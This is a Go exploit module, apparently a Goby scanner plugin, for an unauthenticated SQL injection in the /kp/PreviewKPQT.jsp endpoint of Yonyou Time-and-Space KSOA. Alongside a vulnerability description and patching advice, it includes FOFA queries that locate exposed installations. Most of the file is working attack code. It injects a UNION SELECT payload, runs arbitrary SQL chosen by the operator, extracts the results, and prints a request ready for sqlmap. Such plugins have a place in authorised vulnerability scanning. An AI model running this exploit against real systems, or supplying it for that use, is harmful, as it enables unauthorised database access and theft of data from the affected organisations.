package exploits

import (
  "errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
  expJson := `{
    "Name": "yonyou-Time-and-Space-KSOA /kp/PreviewKPQT.jsp SQL Injection Vulnerability",
    "Description": "<p>yonyou-Time-and-Space-KSOA is a new generation product developed under the guidance of SOA concept, which is a unified IT infrastructure launched according to the cutting-edge IT needs of circulation enterprises. It allows IT systems established by circulation enterprises at various stages to communicate with each other easily.</p><p>There is an SQL injection vulnerability in the /kp/PreviewKPQT.jsp interface of the Yonyou Time and Space KSOA system. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database, and even write trojans to the server under high privilege conditions to further gain server system privileges.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-07-25",
    "PostTime": "2024-11-15",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || (body=\"check.jsp?pid=\" && body=\"jsp\")",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || (body=\"check.jsp?pid=\" && body=\"jsp\")",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the /kp/PreviewKPQT.jsp interface of the Yonyou Time and Space KSOA system. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database, and even write trojans to the server under high privilege conditions to further gain server system privileges.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, apply the patch or upgrade to the latest version:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a> </p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. Prohibit public network access to the system unless necessary.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/140684150?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@version,db_name(),user",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友-时空KSOA /kp/PreviewKPQT.jsp SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>\t用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的 IT 需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的 IT 系统之间彼此轻松对话。&nbsp;</p><p>用友时空KSOA系统 /kp/PreviewKPQT.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>&nbsp;</p><p>&nbsp;2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;&nbsp;</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友时空KSOA系统 /kp/PreviewKPQT.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yonyou-Time-and-Space-KSOA /kp/PreviewKPQT.jsp SQL Injection Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>yonyou-Time-and-Space-KSOA&nbsp;is a new generation product developed under the guidance of SOA concept, which is a unified IT infrastructure launched according to the cutting-edge IT needs of circulation enterprises. It allows IT systems established by circulation enterprises at various stages to communicate with each other easily.</p><p>There is an SQL injection vulnerability in the /kp/PreviewKPQT.jsp interface of the Yonyou Time and Space KSOA system. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database, and even write trojans to the server under high privilege conditions to further gain server system privileges.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, apply the patch or upgrade to the latest version:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>&nbsp;</p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. Prohibit public network access to the system unless necessary.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the /kp/PreviewKPQT.jsp interface of the Yonyou Time and Space KSOA system. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database, and even write trojans to the server under high privilege conditions to further gain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`
  
sendPayloadsikhakjl := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
  setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
    GetRequest := httpclient.NewGetRequestConfig(urlGet)
    GetRequest.Timeout = 12
    GetRequest.VerifyTls = false
    GetRequest.FollowRedirect = false
    for headName, headValue := range head {
      GetRequest.Header.Store(headName, headValue)
    }
    return httpclient.DoHttpRequest(hostInfo, GetRequest)
  }
  
    //按需求选择自己的发包方式
  
    //---------------------------------------------
    //以下是发包具体内容,这里以POST请求为例
    //---------------------------------------------
    //漏洞的url
    encodesql := strings.ReplaceAll(sql, " ", "%20")
    url := `/kp/PreviewKPQT.jsp?KPQTID=1'%20UNION%20ALL%20SELECT%20(`+ encodesql +`),NULL,NULL--%20WoXM`
    //拼接sql语句
    header := map[string]string{
      "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    }
    resp, err := setGetRequest(hostInfo, url, header)
    if err != nil {
      return nil, err
    }
    //状态码可自定义,这里默认200
    if resp.StatusCode != 200 {
      return nil, errors.New("not response 200")
    }
    return resp, nil
  }
  
  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      sendPayload := sendPayloadsikhakjl
      // 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
      // PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
      // SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
      // SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
      // Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
  
      //检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配
  
      //如果是其他类型的注入,请按照具体情况进行检测
      sql := `db_name()`
      resp, err := sendPayload(hostInfo, sql)
      if err != nil {
        return false
      }
      if !strings.Contains(resp.Utf8Html, `nowrap>考评人：<`) {
        return false
      }
     if !strings.Contains(resp.Utf8Html, `nowrap>填表日期：<`) {
        return false
      }
      // 拼接SQL注入数据包的请求路径即可
      ss.VulURL = hostInfo.FixedHostInfo + `/kp/PreviewKPQT.jsp`
      return true
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      sendPayload := sendPayloadsikhakjl
      attackType := goutils.B2S(stepLogs.Params["attackType"])
      
      //Switch ExpParams
      //若自己修改ExpParams,请自行修改switch case
      switch attackType {
      case "default":
        sql := goutils.B2S(stepLogs.Params["default"])
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 200") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`FONT-WEIGHT:bold;FONT-SIZE:16pt">([^<]+)<`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
      case "sql":
        sql := goutils.B2S(stepLogs.Params["sql"])
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 200") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`FONT-WEIGHT:bold;FONT-SIZE:16pt">([^<]+)<`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
  
      case "sqlPoint":
        sql := "db_name()"
        _, err := sendPayload(expResult.HostInfo, sql)
        if err != nil {
          expResult.Output = `Exploitation failed: ` + err.Error()
          expResult.Success = false
          return expResult
        }
        //sqlPoint,给用户跑sqlmap用,需修改对应的参数
        expResult.Success = true
        expResult.Output = `GET /kp/PreviewKPQT.jsp?KPQTID=1'%20UNION%20ALL%20SELECT%20(db_name()),NULL,NULL--%20WoXM HTTP/1.1
  Host: ` + expResult.HostInfo.HostInfo + `
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
  `
        return expResult
      //检查ExpParams是否设置正确
      default:
        expResult.Output = `Unknown attack type: ` + attackType
        expResult.Success = false
        return expResult
      }
    },
  ))
  
  }